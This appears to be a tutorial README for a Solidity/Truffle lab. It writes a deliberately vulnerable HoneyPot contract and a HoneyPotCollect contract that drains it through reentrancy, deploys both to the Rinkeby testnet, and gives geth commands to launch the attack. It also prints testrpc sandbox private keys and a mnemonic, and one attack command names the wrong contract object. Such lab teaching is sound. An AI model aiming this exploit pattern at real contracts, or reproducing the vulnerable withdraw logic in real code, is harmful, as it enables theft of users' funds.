## Introduction

Solidity - Working on smart contract and reentrancy attack with truffle.

Create, test, deploy a contract for put and get ether.

The hack contract use reentrancy attack to get all ether of the last one.

## Requirements

* [nodejs](https://nodejs.org)
* [geth](https://github.com/ethereum/go-ethereum/wiki/Installing-Geth)
* [truffle](https://github.com/trufflesuite/truffle)
* [ethereumjs-testrpc](https://www.npmjs.com/package/ethereumjs-testrpc)

apt-get and npm

```bash
$ sudo apt-get update
$ sudo apt-get install nodejs

$ sudo apt-get install ethereum
$ sudo apt-get install geth

$ npm install -g truffle
```

Brew and yarn

```bash
$ brew update
$ brew install nodejs

$ brew install ethereum
$ brew install geth

$ yarn global add truffle
```

## Setup truffle

Init truffle project

```bash
$ mkdir reentrancy-attack
$ cd reentrancy-attack
$ truffle init
Downloading...
Unpacking...
Setting up...
Unbox successful. Sweet!

Commands:

Compile: truffle compile
Migrate: truffle migrate
Test contracts: truffle test
```


Let see what Truffle has prepared for us :

```bash
.
├── contracts
│   └── Migrations.sol
├── migrations
│   └── 1_initial_migration.js
├── test
├── truffle-config.js
└── truffle.js
```

3 directories and 4 files to start :

* **contracts**: this is where to write and save your contracts
* **migrations**: where to configure and save migrations, migrations are similar to deployments
* **test**: for tests
* **truffle.js** : truffle environment configuration
* **truffle-config.js**: backup of the previous one

Create contracts

```bash
$ truffle create contract HoneyPot

$ truffle create contract HoneyPotCollect
```

2 files be created in folder contracts

Modify it following:

HoneyPot.sol

```bash
pragma solidity ^0.4.8;

contract HoneyPot {
  // maps addresses to a value and store it in a public variable
  mapping (address => uint) public balances;

  // constructor
  function HoneyPot() payable public {
    put();
  }

  // msg is an information when you call function
  function put() payable public {
    // where the storage of the ether value happens
    balances[msg.sender] = msg.value; // msg.sender here is the address from the sender
  }

  function get() public {
    // let addresses to withdraw the value of ether
    if (!msg.sender.call.value(balances[msg.sender])()) {
      revert();
    }
    // empty the balance off sender
    balances[msg.sender] = 0;
  }

  // fallback function
  function() public {
    revert();
  }
}
```

HoneyPotCollect.sol

```bash
pragma solidity ^0.4.4;

import "./HoneyPot.sol";

contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) public {
    // pass an address will be the HoneyPot
    honeypot = HoneyPot(_honeypot);
  }

  // to get the collected ether to an address of hacker
  // mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address
  function kill () public {
    selfdestruct(msg.sender);
  }


  // set the reentrancy attack in motion. It puts some ether in HoneyPot
  function collect() payable public {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }


  // the fallback function is called whenever the HoneyPotCollect contract receives ether
  function () payable public {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}
```

## Testing HoneyPot with testrpc

ethereumjs-testrpc is fast Ethereum RPC client for testing and development

Install

`$ npm install -g ethereumjs-testrpc`

yarn

`$ yarn global add ethereumjs-testrpc`

Create test file

`$ truffle create test HoneyPot`

Write the test for HoneyPot in test/honey_pot.js

```bash
const HoneyPot = artifacts.require('HoneyPot');

contract('HoneyPot', function(accounts) {
  it('HoneyPot testing', async function() {
    // This give a truffle abstraction which allow us to interact with our contracts.
    const contract = await HoneyPot.deployed();

    // Call the put function with value
    await contract.put({value: 6000000});
    // Get sender account balance information
    // Because in default the first address in Avaiable accounts of testrpc is sender
    const putBalance = await contract.balances.call(accounts[0]);
    // Get the value of balance
    const putAmount = putBalance.c[0];

    assert.equal(putAmount, 6000000, 'Put function');

    // Call the get function to get back ether
    await contract.get();
    const getBalance = await contract.balances.call(accounts[0]);
    const getAmount = getBalance.c[0];

    assert.equal(getAmount, 0, 'Get function');
  });
});
```

You need to start TestRpc before deploying and testing, the TestRpc instance
will be launched on localhost and listening on port 8545, the Ethereum RPC
default port

```bash
$ testrpc

EthereumJS TestRPC v6.0.3 (ganache-core: 2.0.2)

Available Accounts
==================
(0) 0x528d11c85bd9adf9db127787857255e399f1ff82
(1) 0x92e3888f7c836f98b323f70f12c26fa48e2b0d51
(2) 0xcb37baedda3fb466a0c3a0edcf0412bff6ddd65f
(3) 0xa15f6c5cfead0ee1385bed8e75a492574a987853
(4) 0x8d475d84719de1edbbd1632e52d31139ceed4c03
(5) 0x1108f19af1a0a321a34a7bbd182898faea6144db
(6) 0x0a069348ae8623f3dd82c79bb360d266e1199e58
(7) 0xf79a0699bb3f17e6cd99e15e48aebed104958ab8
(8) 0x209e579c0d74d36bb7db2eeb74b6a1c101e99ba6
(9) 0xd46dc16ffd09f228fd2167aa4a9496656db2d924

Private Keys
==================
(0) 0789ec016725dce25f7776c61971e71feb0391e03e2449dd5d3a81e3810bc008
(1) 5882a445c06b87ed989b5a3464d52c71f916ff6b46db77e689e8e016efc8576a
(2) e264fb4386a51b4f78c22f23261aa2d5f0971de7549d5f82c16567b78fd3052c
(3) a6e15fdc879166b828f2c1697681fba8ef6b2c7a7323d9ce49671d11b01088bc
(4) f906821e13792fa8e3fde484ba160c2798fbe0937ce52ef9e689137ef0ea63db
(5) b01b1cce7af3ec6d812f74f7f5542d5ff0102f633a0db8c22a9285f9939ed121
(6) f2991f2d097a4097903cba3bd29f053e32bd53fe7707a0def7b1ad140149f888
(7) c6067e28258f8bf2c903c0112286d953c0d8dba8c15c528a2d88269d4ebf977e
(8) 4e3a65b407324bf5bab44e0dd9da85857a064822c14e36f6b4d87b8aa3db258e
(9) cf843a6cf328a7e257339846f0e7363d4752083b80741abf658bf6b3c676df67

HD Wallet
==================
Mnemonic: current drop shallow guilt want robot cigar panda report must fatal angry
Base HD Path: m/44'/60'/0'/0/{account_index}

Listening on localhost:8545
```

Running test

`$ truffle test`

Result

```bash
Using network 'test'.

Compiling ./contracts/HoneyPot.sol...
Compiling ./contracts/HoneyPotCollect.sol...


  Contract: HoneyPot
    ✓ HoneyPot testing (113ms)


  1 passing (131ms)
```

## Deploy smart contract

Create rinkeby address with geth

To run a full node, start Geth with the Rinkeby switch

`geth --rinkeby`

After that, attach the console with the appropriate data directory.

Interact with Ethereum node

```bash
$ cd ~/Library/Ethereum/rinkeby

// On Linux
$ cd ~/.rinkeby

$ geth attach ipc:geth.ipc
```
Create an account

```bash
Welcome to the Geth JavaScript console!

instance: Geth/v1.6.1-stable-021c3c28/darwin-amd64/go1.8.1
 modules: admin:1.0 clique:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0

> eth.accounts
[]
> personal.newAccount("<password>")
"<address>"
> eth.coinbase
"<address>"
> eth.getBalance(eth.coinbase)
0
```

Request ETH:

Go to the Crypto Faucet: https://faucet.rinkeby.io/ 
Following it to get some ETH for your address

Update truffle config

```bash
module.exports = {
  networks: {
    rinkeby: {
      host: 'localhost', // Connect to geth on the specified
      port: 8545,
      from: '<address>', // default address to use for any transaction                                                                                                  //Truffle makes during migrations
      network_id: 4,
      gas: 4612388, // Gas limit used for deploys
    },
  },
};
```

Create the migration

`$ truffle create migration deploy_honey_pot_collect`

A migration file (***_deploy_honey_pot_collect.js) corresponding to the contract should have been created under migrations folder

```bash
const HoneyPot = artifacts.require('HoneyPot');
const HoneyPotCollect = artifacts.require('HoneyPotCollect');

module.exports = function(deployer) {
  // Use deployer to state migration tasks.
  deployer.deploy(HoneyPot).then(function() {
    // deploy HoneyPotCollect with HoneyPot contract address is constructor arguments 
    return deployer.deploy(HoneyPotCollect, HoneyPot.address);
  });
};
```

We need to unlock our test account so we can interact with it via Truffle. To do so, stop geth and start with the following parameters

```bash
$ geth --rinkeby --rpc --rpcapi db,eth,net,web3,personal --unlock="<address>"
```

Unlock the address by web3 in geth console

```bash
> web3.personal.unlockAccount("<address>","<password>")
> true
```

Deploy

```bash
$ truffle migrate --network rinkeby
```

Result

```bash
Using network 'rinkeby'

Running migration: 1_initial_migration.js
  Deploying Migrations...
  ... 0x683d7e00ae938922b8aea88d2b2f28c259e472026566e39b27d1155a56feeb93
  Migrations: 0x96aaab79bbfc9460ae3989d79a5e25219e321ae3
Saving successful migration to network...
  ... 0x7657dadde1117b037d1f74b1d29bcd3609379d4ee6ac88104e7a8b9c691c8a4c
Saving artifacts...
Running migration: 1516948528_deploy_honey_pot_collect.js
  Deploying HoneyPot...
  ... 0xc1551491dd931412244ec2f96baca0ee65ec4eed370f4e43ce843c902be01596
  HoneyPot: 0x349b7c52fca0699953aaad427521b344ef7ee7ce
  Deploying HoneyPotCollect
  ... 0xb0af8ad7a28d5dce252443aff9c41266fc5f6c5cbdfa62ede742c3750034b1d9
  HoneyPotCollect: 0xd4c5b4f498102882c9730d0868b589fa4a3ac5d0
Saving successful migration to network...
  ... 0x2806324946988e9b24240adc3b4b57c23c837fef26f4bd917c0737c52b20cc39
Saving artifacts
```

Note: all `<address>` is your address create by geth also an address to deploy the smart contract.

## Reentrancy attack

Interact with smart contract in geth console

You not only need the address but also the ABI for the contract 

To get the ABI is you paste your source code it in [Solidity Browser](https://chriseth.github.io/browser-solidity), then copy the Interface value, it is ABI

Source code

```bash
pragma solidity ^0.4.4;

contract HoneyPot {
  mapping (address => uint) public balances;

  function HoneyPot() payable public {
    put();
  }

  function put() payable public {
    balances[msg.sender] = msg.value; // msg.sender here is the address from the sender
  }

  function get() public {
    if (!msg.sender.call.value(balances[msg.sender])()) {
      revert();
    }
    balances[msg.sender] = 0;
  }

  function() public {
    revert();
  }
}

contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) public {
    honeypot = HoneyPot(_honeypot);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }

  function collect() payable public {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }

  function () payable public {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}
```

Interact with smart contract

```bash
> var honeyPotAbi = eth.contract(<honeyPotAbi>);
> var HoneyPot = honeyPotAbi.at(<honeyPotAddress);
```

Call put function (The similar with get)

```bash
> HoneyPot.put({from: "<senderAddress>", value: <value>}) // no need "value" when get()
> "<transaction>" // result
```

Check contract's storage (balances) 

```bash
> HoneyPot.balances("<senderAddress>")
> 600000000000000000 // 0 after get()
```

### Attack

Call collect function and sending with it some ether.

```bash
> var honeyPotCollectAbi = eth.contract(<honeyPotCollectAbi>);
> var HoneyPotCollect = honeyPotCollectAbi.at(honeyPotCollectAddress);

> HoneyPot.collect({from: "<hackerAddress>", value: <value>})
// remember unlock address before
```

HoneyPot get function sends ether to the address that called it only if this contract has any ether as balance.

When HoneyPot sends ether to HoneyPotCollect the fallback function is triggered.

If the HoneyPot balance is more than the value that it was sent to, the fallback function calls get function once again and the cycle repeats


Check hack contract account balance

`eth.getBalance(HoneyPotCollect.address)`

## References

[Reentrancy Attack On Smart Contracts](https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4)

[Smart Contract Testing & Ethereum Simulator](https://medium.com/etherereum-salon/eth-testing-472c2f73b4c3)

[How to get on Rinkeby Testnet in less than 10 minutes](https://gist.github.com/cryptogoth/10a98e8078cfd69f7ca892ddbdcf26bc)

[Deploying Truffle Contracts to Rinkeby](https://blog.abuiles.com/blog/2017/07/09/deploying-truffle-contracts-to-rinkeby/)

https://ethereum.stackexchange.com/questions/8736/how-to-call-my-contracts-function-using-sendtransaction
